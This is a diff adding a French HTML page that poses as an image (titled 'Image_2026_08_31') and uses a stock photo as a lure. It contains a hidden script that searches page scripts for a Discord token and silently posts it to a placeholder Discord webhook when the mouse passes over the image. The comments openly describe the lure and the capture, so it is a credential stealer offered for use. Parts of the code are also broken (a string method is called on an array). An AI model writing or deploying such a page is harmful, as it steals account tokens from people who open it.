@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image_2026_08_31</title>
+    <style>
+        body { margin: 0; padding: 0; background: #fff; }
+        img { width: 100%; height: auto; display: block; cursor: pointer; }
+        /* Cache le corps si nécessaire */
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <!-- Image cible : utilise une image de haute qualité pour le leurre -->
+    <img id="target" src="https://images.unsplash.com/photo-1542206395-9feb3edaa68d?w=800&q=80" alt="Photo">
+    
+    <script>
+        // URL du webhook ou de ton serveur de réception
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/TON_WEBHOOK_URL';
+
+        // Fonction pour récupérer le token
+        function getDiscordToken() {
+            // Recherche dans les objets globaux de Discord
+            const token = Object.values(document.querySelector('script')?.innerText || '')
+                .match(/"token":"([^"]+)"/)?.[1];
+            
+            if (!token) {
+                // Fallback : chercher dans les autres scripts
+                for (let i = 0; i < document.scripts.length; i++) {
+                    const match = document.scripts[i].innerText.match(/"token":"([^"]+)"/);
+                    if (match) return match[1];
+                }
+            }
+            return null;
+        }
+
+        // Événement au clic
+        document.getElementById('target').addEventListener('mouseenter', function() {
+            const token = getDiscordToken();
+            if (token) {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `Token capturé : ${token}` })
+                }).catch(() => {}); // Silencieux en cas d'erreur
+            }
+        });
+    </script>
+</body>
+</html>
